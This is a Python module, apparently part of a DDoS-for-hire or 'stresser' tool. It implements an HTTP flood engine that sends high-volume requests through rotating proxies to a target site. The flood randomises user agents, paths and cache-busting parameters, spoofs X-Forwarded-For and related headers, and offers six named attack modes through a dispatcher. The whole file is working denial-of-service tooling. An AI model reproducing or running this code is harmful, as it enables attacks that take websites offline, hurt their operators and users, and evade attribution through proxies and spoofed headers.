import os
import asyncio
import random
import time
import ssl
import hashlib
import json
import logging
from typing import List, Dict, Optional, Callable, Awaitable
from urllib.parse import urlparse, quote, quote_plus

import aiohttp
from aiohttp import ClientTimeout, ClientSession, TCPConnector

from app.core.logger import logger
from app.core.models import ProxyItem

# ========== PROXY ROTATOR ==========
from app.engine.proxy_rotator import ProxyRotator

# ========== CONFIGURATION ==========
MAX_CONNECTIONS_PER_HOST = 5000
MAX_TOTAL_CONNECTIONS = 50000
CONNECTION_TIMEOUT = 3
REQUEST_TIMEOUT = 5

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
]

# ========== HELPER FUNCTIONS ==========

def _random_ua() -> str:
    return random.choice(USER_AGENTS)

def _random_path() -> str:
    paths = [
        f"/{random.randint(100000, 999999)}",
        f"/{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}",
        f"/api/v{random.randint(1, 5)}/{random.randint(1000, 9999)}",
        f"/static/{random.randint(1, 999)}/js/main.{random.randint(1000, 9999)}.js",
        f"/images/{random.randint(1, 999)}/logo.{random.choice(['png', 'jpg', 'svg'])}",
        f"/?cache={random.randint(100000, 999999)}",
        f"/?v={random.randint(100000, 999999)}",
    ]
    return random.choice(paths)

def _random_headers() -> Dict[str, str]:
    return {
        "User-Agent": _random_ua(),
        "Accept": random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "application/json, text/plain, */*",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        ]),
        "Accept-Language": random.choice([
            "en-US,en;q=0.9",
            "id-ID,id;q=0.9,en;q=0.8",
            "zh-CN,zh;q=0.9,en;q=0.8",
        ]),
        "Accept-Encoding": random.choice([
            "gzip, deflate, br",
            "gzip, deflate",
            "br",
        ]),
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Connection": random.choice(["keep-alive", "close"]),
        "Sec-Ch-Ua": f'"Chromium";v="{random.randint(110, 120)}", "Google Chrome";v="{random.randint(110, 120)}"',
        "Sec-Ch-Ua-Mobile": random.choice(["?0", "?1"]),
        "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"']),
        "Sec-Fetch-Dest": random.choice(["document", "empty", "script", "image"]),
        "Sec-Fetch-Mode": random.choice(["navigate", "no-cors", "cors"]),
        "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
    }

def _normalize_target(target: str) -> tuple:
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    parsed = urlparse(target)
    scheme = parsed.scheme or "https"
    host = parsed.netloc or parsed.path
    path = parsed.path or "/"
    return scheme, host, path

def _parse_proxy_url(proxy_url: str) -> Optional[ProxyItem]:
    """Parse string proxy URL into ProxyItem."""
    if not proxy_url:
        return None
    proxy_url = proxy_url.strip()
    protocol = "http"
    if "://" in proxy_url:
        protocol, rest = proxy_url.split("://", 1)
        proxy_url = rest
    else:
        proxy_url = proxy_url.replace("http://", "").replace("https://", "").replace("socks4://", "").replace("socks5://", "")
    if ":" in proxy_url:
        ip, port_str = proxy_url.rsplit(":", 1)
        try:
            port = int(port_str)
            return ProxyItem(ip=ip, port=port, protocol=protocol)
        except ValueError:
            return None
    return None

# ========== CORE ATTACK ENGINE ==========

async def _http_attack(
    attack_id: str,
    target: str,
    port: int,
    duration: int,
    hold_time: int,
    proxies: List[ProxyItem],
    on_update: Optional[Callable[[str, int, int, int], Awaitable[None]]],
    method: str = "GET",
    headers: Optional[Dict[str, str]] = None,
    body: Optional[bytes] = None,
    use_ssl: bool = True,
    http_version: str = "HTTP/1.1",
    keep_alive: bool = True,
    rotator: Optional[ProxyRotator] = None,
    rps_limit: int = 0,
) -> None:
    total_requests = 0
    start_time = time.time()
    total_duration = duration + hold_time
    end_time = start_time + total_duration

    scheme, host, base_path = _normalize_target(target)
    actual_port = port if port else (443 if scheme == "https" else 80)
    use_ssl = scheme == "https"
    url = f"{scheme}://{host}:{actual_port}"

    if rotator is None:
        rotator = ProxyRotator()
        await rotator.update_proxies(proxies)
    else:
        if proxies:
            await rotator.update_proxies(proxies)

    if headers is None:
        headers = {}
    base_headers = headers.copy()

    connector = TCPConnector(
        limit=MAX_TOTAL_CONNECTIONS,
        limit_per_host=MAX_CONNECTIONS_PER_HOST,
        ttl_dns_cache=300,
        use_dns_cache=True,
        enable_cleanup_closed=True,
    )

    timeout = ClientTimeout(
        total=REQUEST_TIMEOUT,
        connect=CONNECTION_TIMEOUT,
        sock_read=CONNECTION_TIMEOUT,
    )

    rps_counter = 0
    last_update = time.time()
    update_interval = 1.0  # FIX: update tiap 1 detik (bukan 0.5)

    target_rps = rps_limit if rps_limit > 0 else 999999999
    start_of_second = int(time.time())
    requests_this_second = 0

    async with ClientSession(
        connector=connector,
        timeout=timeout,
        trust_env=False,
    ) as session:
        try:
            while time.time() < end_time:
                # FIX: Check cancelled
                await asyncio.sleep(0)

                current_second = int(time.time())
                if current_second != start_of_second:
                    start_of_second = current_second
                    requests_this_second = 0

                if requests_this_second >= target_rps:
                    wait_time = (start_of_second + 1) - time.time()
                    if wait_time > 0:
                        await asyncio.sleep(wait_time)
                    continue

                if total_requests % 200 == 0:
                    await asyncio.sleep(0)

                proxy_item = None
                proxy_url = None
                try:
                    proxy_item = await rotator.get_proxy()
                    if proxy_item:
                        proxy_url = f"http://{proxy_item.ip}:{proxy_item.port}"
                    else:
                        logger.warning(f"[{attack_id}] No proxy available, using direct connection!")

                    random_path = _random_path()
                    full_url = f"{url}{random_path}"
                    if base_path and base_path != "/" and not base_path.startswith("/"):
                        full_url = f"{url}/{base_path}{random_path}"

                    if "?" not in random_path:
                        full_url += f"?_={int(time.time()*1000)}"

                    req_headers = _random_headers()
                    if base_headers:
                        req_headers.update(base_headers)

                    if method.upper() == "POST":
                        if body is None:
                            body = json.dumps({"key": hashlib.md5(str(time.time()).encode()).hexdigest()}).encode()
                        req_headers["Content-Length"] = str(len(body))
                        req_headers["Content-Type"] = "application/json"

                    async with session.request(
                        method=method,
                        url=full_url,
                        headers=req_headers,
                        data=body if method.upper() == "POST" else None,
                        proxy=proxy_url,
                        ssl=False if not use_ssl else None,
                        timeout=timeout,
                    ) as resp:
                        await resp.read()
                        total_requests += 1
                        rps_counter += 1
                        requests_this_second += 1
                        if proxy_item:
                            rotator.release_proxy(proxy_item, success=True, latency=0.0)

                except asyncio.CancelledError:
                    raise
                except Exception as e:
                    if proxy_item:
                        await rotator.mark_dead(proxy_item)
                        rotator.release_proxy(proxy_item, success=False, latency=0.0)

                now = time.time()
                if now - last_update >= update_interval:
                    proxy_count = await rotator.get_alive_count()
                    if on_update:
                        await on_update(attack_id, rps_counter, total_requests, proxy_count)
                    rps_counter = 0
                    last_update = now
        except asyncio.CancelledError:
            logger.info(f"[{attack_id}] Attack cancelled")
            raise
        finally:
            proxy_count = await rotator.get_alive_count()
            if on_update:
                await on_update(attack_id, 0, total_requests, proxy_count)
            logger.info(f"HTTP attack {attack_id} completed: {total_requests} requests")


# ========== LAYER 7 METHODS ==========

async def run_spectre(attack_id, target, port, duration, hold_time, proxies, on_update=None, rotator=None, rps_limit=0):
    logger.info(f"[SPECTRE] Attack {attack_id} started: {target}:{port}")
    headers = {
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "X-Originating-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
    }
    await _http_attack(attack_id, target, port, duration, hold_time, proxies, on_update, "GET", headers, None, True, "HTTP/1.1", True, rotator, rps_limit)

async def run_vortex(attack_id, target, port, duration, hold_time, proxies, on_update=None, rotator=None, rps_limit=0):
    logger.info(f"[VORTEX] Attack {attack_id} started: {target}:{port}")
    large_body = os.urandom(4096) if random.random() > 0.5 else b"A" * 8192
    headers = {
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary" + hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
        "Connection": "keep-alive",
        "Keep-Alive": f"timeout={duration+hold_time}, max=1000",
    }
    await _http_attack(attack_id, target, port, duration, hold_time, proxies, on_update, "POST", headers, large_body, True, "HTTP/2", True, rotator, rps_limit)

async def run_titan(attack_id, target, port, duration, hold_time, proxies, on_update=None, rotator=None, rps_limit=0):
    logger.info(f"[TITAN] Attack {attack_id} started: {target}:{port}")
    headers = {"Connection": "keep-alive", "Accept": "*/*", "Cache-Control": "no-cache"}
    await _http_attack(attack_id, target, port, duration, hold_time, proxies, on_update, "GET", headers, None, True, "HTTP/1.1", True, rotator, rps_limit)

async def run_phantom(attack_id, target, port, duration, hold_time, proxies, on_update=None, rotator=None, rps_limit=0):
    logger.info(f"[PHANTOM] Attack {attack_id} started: {target}:{port}")
    headers = {"Connection": "keep-alive", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
    await _http_attack(attack_id, target, port, duration, hold_time, proxies, on_update, "GET", headers, None, True, "HTTP/1.1", True, rotator, rps_limit)

async def run_serpent(attack_id, target, port, duration, hold_time, proxies, on_update=None, rotator=None, rps_limit=0):
    logger.info(f"[SERPENT] Attack {attack_id} started: {target}:{port}")
    headers = {
        "Connection": "keep-alive",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Keep-Alive": "max=1000",
        "Accept-Encoding": "gzip, deflate",
        "Transfer-Encoding": "chunked",
    }
    await _http_attack(attack_id, target, port, duration, hold_time, proxies, on_update, "GET", headers, None, True, "HTTP/1.1", True, rotator, rps_limit)

async def run_storm(attack_id, target, port, duration, hold_time, proxies, on_update=None, rotator=None, rps_limit=0):
    logger.info(f"[STORM] Attack {attack_id} started: {target}:{port}")
    headers = {"Accept": "*/*", "Connection": "keep-alive", "Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache"}
    await _http_attack(attack_id, target, port, duration, hold_time, proxies, on_update, "GET", headers, None, True, "HTTP/1.1", True, rotator, rps_limit)


# ========== DISPATCHER ==========

async def run_layer7_attack(attack_id, target, port, method, duration, hold_time=0, proxies=None, on_update=None, rps_limit=0):
    if proxies is None:
        proxies = []

    # FIX: Convert string URLs to ProxyItem objects
    proxy_items = []
    for p in proxies:
        if isinstance(p, str):
            item = _parse_proxy_url(p)
            if item:
                proxy_items.append(item)
        elif isinstance(p, ProxyItem):
            proxy_items.append(p)

    rotator = ProxyRotator()
    await rotator.update_proxies(proxy_items)
    logger.info(f"Created rotator with {len(proxy_items)} proxies for attack {attack_id}")

    method_map = {
        "spectre": run_spectre,
        "vortex": run_vortex,
        "titan": run_titan,
        "phantom": run_phantom,
        "serpent": run_serpent,
        "storm": run_storm,
    }

    engine = method_map.get(method.lower())
    if engine is None:
        logger.warning(f"Unknown layer7 method: {method}, using titan as fallback")
        engine = run_titan

    await engine(attack_id, target, port, duration, hold_time, proxy_items, on_update, rotator, rps_limit)
